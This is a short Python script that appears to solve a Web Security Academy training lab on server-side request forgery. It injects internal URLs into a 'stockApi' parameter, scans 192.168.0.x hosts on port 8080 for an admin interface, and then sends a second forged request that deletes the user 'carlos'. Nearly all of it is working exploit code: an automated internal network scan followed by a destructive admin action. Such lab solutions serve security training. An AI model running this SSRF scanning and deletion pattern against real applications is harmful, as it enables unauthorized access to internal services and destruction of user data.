#############################################################
#
# Lab: Basic SSRF against another back-end system
#
# Hack Steps:
#      1. Inject payload into 'stockApi' parameter to scan
#         the internal network
#       2. Delete carlos from the admin interface
#
#############################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a93001304831a07816f6cc5001b0023.web-security-academy.net" 

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "stockApi")

    for x in range(0,255):
        payload = f"http://192.168.0.{x}:8080/admin"

        print(Fore.WHITE + "⦗1⦘ Injecting payload to scan the internal netwrok (" + Fore.YELLOW + f"192.168.0.{x}:8080/admin" + Fore.WHITE + ").. ", end="\r", flush=True)
        
        data = { "stockApi": payload }
        check_stock = post_data("/product/stock", data)
        
        if check_stock.status_code == 200:
            print(Fore.WHITE + "⦗1⦘ Injecting payload to scan the internal netwrok (" + Fore.YELLOW + f"192.168.0.{x}:8080/admin" + Fore.WHITE + ").. " + Fore.GREEN + "OK")
            print(Fore.WHITE + "⦗2⦘ Deleting carlos from the admin interface.. ", end="", flush=True)
            
            data = { "stockApi": f"{payload}/delete?username=carlos" }
            post_data("/product/stock", data)
            
            print(Fore.GREEN + "OK")
            print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

            exit(0)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1) 


if __name__ == "__main__":
    main()